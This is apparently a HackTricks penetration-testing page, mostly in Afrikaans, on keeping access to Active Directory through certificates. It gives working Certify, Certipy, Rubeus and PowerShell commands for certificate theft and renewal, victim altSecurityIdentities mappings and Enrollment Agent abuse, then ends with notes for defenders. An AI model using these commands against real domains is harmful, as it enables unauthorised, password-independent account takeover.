# AD CS Account Persistence

{{#include ../../../banners/hacktricks-training.md}}

**Dit is 'n kort samevatting van die account persistence-hoofstukke van die uitstekende navorsing van [https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)**

## Understanding Active User Credential Theft with Certificates – PERSIST1

In 'n scenario waar 'n sertifikaat wat domeinverifikasie toelaat deur 'n gebruiker aangevra kan word, het 'n aanvaller die geleentheid om hierdie sertifikaat aan te vra en te steel om persistence op 'n netwerk te behou. Standaard laat die `User`-sjabloon in Active Directory sulke versoeke toe, alhoewel dit soms gedeaktiveer mag wees.

Deur [Certify](https://github.com/GhostPack/Certify) of [Certipy](https://github.com/ly4k/Certipy) te gebruik, kan jy soek na ingeskakelde sjablone wat kliëntverifikasie toelaat en dan een versoek:
```bash
# Enumerate client-auth capable templates
Certify.exe find /clientauth

# Request a user cert from an Enterprise CA (current user context)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User

# Using Certipy (RPC/DCOM/WebEnrollment supported). Saves a PFX by default
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' -template 'User' -out user.pfx
```
Die krag van 'n sertifikaat lê in die vermoë om as die gebruiker waaraan dit behoort te autentiseer, ongeag wagwoordveranderinge, solank die sertifikaat geldig bly.

Jy kan PEM na PFX omskakel en dit gebruik om 'n TGT te verkry:
```bash
# Convert PEM returned by Certify to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Use certificate for PKINIT and inject the TGT
Rubeus.exe asktgt /user:john /certificate:C:\Temp\cert.pfx /password:CertPass! /ptt

# Or with Certipy
certipy auth -pfx user.pfx -dc-ip 10.0.0.10
```
> Let wel: In kombinasie met ander tegnieke (sien THEFT-afdelings), sertifikaatgebaseerde auth laat volhoubare toegang toe sonder om LSASS aan te raak en selfs vanuit nie-geëscaleerde kontekste.

## Verkryging van Machine-persistensie met sertifikate - PERSIST2

As 'n aanvaller verhoogde voorregte op 'n gasheer het, kan hulle die gekompromitteerde stelsel se machine-rekening registreer vir 'n sertifikaat met die standaard `Machine` template. Verifikasie as die machine skakel S4U2Self vir plaaslike dienste in en kan volhoubare gasheer-persistensie bied:
```bash
# Request a machine certificate as SYSTEM
Certify.exe request /ca:dc.theshire.local/theshire-DC-CA /template:Machine /machine

# Authenticate as the machine using the issued PFX
Rubeus.exe asktgt /user:HOSTNAME$ /certificate:C:\Temp\host.pfx /password:Passw0rd! /ptt
```
## Volgehoue toegang via sertifikaathernuwing - PERSIST3

Die misbruik van die geldigheids- en hernuwingsperiodes van sertifikaatsjablone stel 'n aanvaller in staat om langtermyn toegang te behou. As jy 'n reeds uitgereikte sertifikaat en die private sleutel daarvan besit, kan jy dit voor verstryking hernu om 'n vars, langlewende toegangsbewys te bekom sonder om bykomende versoekartefakte te laat wat aan die oorspronklike prinsipaal gekoppel is.
```bash
# Renewal with Certipy (works with RPC/DCOM/WebEnrollment)
# Provide the existing PFX and target the same CA/template when possible
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -pfx user_old.pfx -renew -out user_renewed.pfx

# Native Windows renewal with certreq
# (use the serial/thumbprint of the cert to renew; reusekeys preserves the keypair)
certreq -enroll -user -cert <SerialOrID> renew [reusekeys]
```
> Operasionele wenk: Hou leeftye van deur-aanvaller-beheerde PFX-lêers dop en hernu vroeg. Hernuwing kan ook veroorsaak dat opgedateerde sertifikate die moderne SID-mapping-uitbreiding insluit, wat dit bruikbaar hou onder strenger DC-mappingsreëls (sien volgende afdeling).

## Plasing van eksplisiete sertifikaat-toewysings (altSecurityIdentities) – PERSIST4

As jy na 'n teikenrekening se `altSecurityIdentities`-attribuut kan skryf, kan jy 'n deur-aanvaller-beheerde sertifikaat eksplisiet aan daardie rekening koppel. Dit bly bestaan oor wagwoordveranderings heen en, wanneer sterk mapping-formate gebruik word, bly dit funksioneel onder moderne DC-afdwinging.

Hoëvlak vloei:

1. Verkry of keur 'n client-auth sertifikaat wat jy beheer uit (bv., registreer die `User`-sjabloon as jouself).
2. Haal 'n sterk identifiseerder uit die sertifikaat (Issuer+Serial, SKI, or SHA1-PublicKey).
3. Voeg 'n eksplisiete toewysing by op die slagoffer-prinsipaal se `altSecurityIdentities` met daardie identifiseerder.
4. Meld aan met jou sertifikaat; die DC koppel dit aan die slagoffer deur die eksplisiete toewysing.

Voorbeeld (PowerShell) wat 'n sterk Issuer+Serial-toewysing gebruik:
```powershell
# Example values - reverse the issuer DN and serial as required by AD mapping format
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SerialR = '1200000000AC11000000002B' # reversed byte order of the serial
$Map     = "X509:<I>$Issuer<SR>$SerialR"

# Add mapping to victim. Requires rights to write altSecurityIdentities on the object
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Meld dan aan met jou PFX. Certipy sal direk 'n TGT bekom:
```bash
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10

# If PKINIT is unavailable on the DC, reuse the same persisted cert via Schannel/LDAPS
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell
```
### Bou Sterk `altSecurityIdentities`-kaartleggings

In praktyk is **Issuer+Serial** en **SKI** kaartleggings die maklikste sterk formate om te bou vanaf 'n sertifikaat wat deur 'n aanvaller besit word. Dit maak saak na **11 Februarie 2025**, wanneer DCs standaard op **Full Enforcement** staan en swakke kaartleggings onbetroubaar raak.
```bash
# Extract issuer, serial and SKI from a cert/PFX
openssl pkcs12 -in attacker_user.pfx -clcerts -nokeys -out attacker_user.crt
openssl x509 -in attacker_user.crt -noout -issuer -serial -ext subjectKeyIdentifier
```

```powershell
# Example strong SKI mapping for a user or computer object
$Map = 'X509:<SKI>9C4D7E8A1B2C3D4E5F60718293A4B5C6D7E8F901'
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
# Set-ADComputer -Identity 'WS01$' -Add @{altSecurityIdentities=$Map}
```
Aantekeninge
- Gebruik slegs sterk koppelings-tipes: `X509IssuerSerialNumber`, `X509SKI`, or `X509SHA1PublicKey`. Swakker formate (Subject/Issuer, Subject-only, RFC822 email) is verouderd en kan deur DC-beleid geblokkeer word.
- Die koppelings werk op beide **gebruiker** en **rekenaar** voorwerpe, so skryftoegang tot 'n rekenaarrekening se `altSecurityIdentities` is genoeg om as daardie masjien te bly bestaan.
- Die sertifikaatketting moet opbou na 'n wortel wat deur die DC vertrou word. Enterprise CAs in NTAuth word tipies vertrou; sommige omgewings vertrou ook publieke CAs.
- Schannel authentication bly nuttig vir persistentie selfs wanneer PKINIT misluk omdat die DC nie die Smart Card Logon EKU het nie of `KDC_ERR_PADATA_TYPE_NOSUPP` teruggee.

Vir meer oor swak eksplisiete koppelings en aanvalspaaie, sien:


{{#ref}}
domain-escalation.md
{{#endref}}

## Enrollment Agent as Persistence – PERSIST5

If you obtain a valid Certificate Request Agent/Enrollment Agent certificate, you can mint new logon-capable certificates on behalf of users at will and keep the agent PFX offline as a persistence token. Abuse workflow:
```bash
# Request an Enrollment Agent cert (requires template rights)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:"Certificate Request Agent"

# Mint a user cert on behalf of another principal using the agent PFX
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User \
/onbehalfof:CORP\\victim /enrollcert:C:\Temp\agent.pfx /enrollcertpw:AgentPfxPass

# Or with Certipy
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -on-behalf-of 'CORP/victim' -pfx agent.pfx -out victim_onbo.pfx
```
Herroeping van die agentsertifikaat of sjabloontoestemmings is vereis om hierdie persistering uit te wis.

Operasionele notas
- Moderne `Certipy` weergawes ondersteun beide `-on-behalf-of` en `-renew`, sodat 'n aanvaller wat 'n Enrollment Agent PFX in besit het blaarsertifikate kan uitreik en later kan hernu sonder om weer die oorspronklike teikenrekening aan te raak.
- As PKINIT-gebaseerde TGT-herwinning nie moontlik is nie, is die resulterende on-behalf-of-sertifikaat steeds bruikbaar vir Schannel-verifikasie met `certipy auth -pfx victim_onbo.pfx -dc-ip 10.0.0.10 -ldap-shell`.

## 2025: Afdwinging van Sterk Sertifikaattoewysing — Impak op Persistensie

Microsoft KB5014754 het Strong Certificate Mapping Enforcement op domain controllers geïntroduseer. Sedert 11 Februarie 2025 staan DC's standaard op Full Enforcement, wat swak/ambigue toewysings verwerp. Praktiese implikasies:

- Pre-2022 sertifikate wat die SID-mapping-uitbreiding mis, kan implisiete toewysing faal wanneer DC's op Full Enforcement is. Aanvallers kan toegang behou deur óf sertifikate deur AD CS te hernu (om die SID-uitbreiding te kry) óf deur 'n sterk eksplisiete toewysing in `altSecurityIdentities` (PERSIST4) te plant.
- Eksplisiete toewysings wat sterk formate gebruik (Issuer+Serial, SKI, SHA1-PublicKey) bly werk. Swak formate (Issuer/Subject, Subject-only, RFC822) kan geblokkeer word en moet vermy word vir persistering.

Administrateurs moet monitor en waarsku oor:
- Veranderings aan `altSecurityIdentities` en uitreikings/hernuwings van Enrollment Agent- en User-sertifikate.
- CA-uitreikingslogboeke vir on-behalf-of-versoeke en ongewoonse hernuwingspatrone.

## Verwysings

- Microsoft. KB5014754: Sertifikaatgebaseerde verifikasie-wijzigings op Windows domain controllers (afdwingingstydlyn en sterk toewysings).
https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
- SpecterOps. ADCS ESC14 Misbruiktegniek (eksplisiete `altSecurityIdentities` misbruik op gebruikers-/rekenaarsobjekte).
https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/
- Certipy Wiki – Opdragverwysing (`req -renew`, `auth`, `shadow`).
https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference
- Almond Offensive Security. Verifikasie met sertifikate wanneer PKINIT nie ondersteun word nie.
https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html

{{#include ../../../banners/hacktricks-training.md}}
